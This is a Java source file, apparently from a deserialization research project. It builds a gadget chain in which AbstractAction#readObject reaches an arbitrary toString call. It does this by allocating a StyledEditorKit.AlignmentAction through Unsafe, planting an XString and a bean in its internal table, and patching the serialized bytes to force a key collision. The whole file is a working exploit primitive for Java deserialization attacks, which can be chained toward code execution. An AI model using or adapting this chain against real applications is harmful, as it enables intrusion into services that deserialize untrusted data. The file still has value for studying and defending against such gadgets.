package com.xiinnn.readobject2tostring;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.xiinnn.template.ToStringClass;
import sun.misc.Unsafe;

import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

// AbstractAction#readObject -> toString
public class AbstractActionReadObject2ToString {
    public static void main(String[] args) throws Exception{
        ToStringClass toStringBean = new ToStringClass();
        XString xString = new XString("");

        // 用Unsafe获取AlignmentAction类
        Class<?> c = Class.forName("sun.misc.Unsafe");
        Constructor<?> constructor = c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Unsafe unsafe = (Unsafe) constructor.newInstance();
        StyledEditorKit.AlignmentAction action= (StyledEditorKit.AlignmentAction) unsafe.allocateInstance(StyledEditorKit.AlignmentAction.class);

        setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));

        action.putValue("fff123", "");
        action.putValue("aff123", "");

        Field arrayTable = AbstractAction.class.getDeclaredField("arrayTable");
        arrayTable.setAccessible(true);
        Object tables = arrayTable.get(action);
        Field tableField = tables.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[])tableField.get(tables);
        table[1] = xString;
        table[3] = toStringBean;
        tableField.set(tables, table);
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(action);
        oos.close();
        byte[] bytes = baos.toByteArray();
        // 将aff123改成fff123
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 97 && bytes[i+1] == 102 && bytes[i+2] == 102 && bytes[i+3] == 49 && bytes[i+4] == 50 &&
                    bytes[i+5] == 51){
                bytes[i] = 102;
                break;
            }
        }
        // 反序列化触发ToStringClass#toSrting
        unserialize(bytes);
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}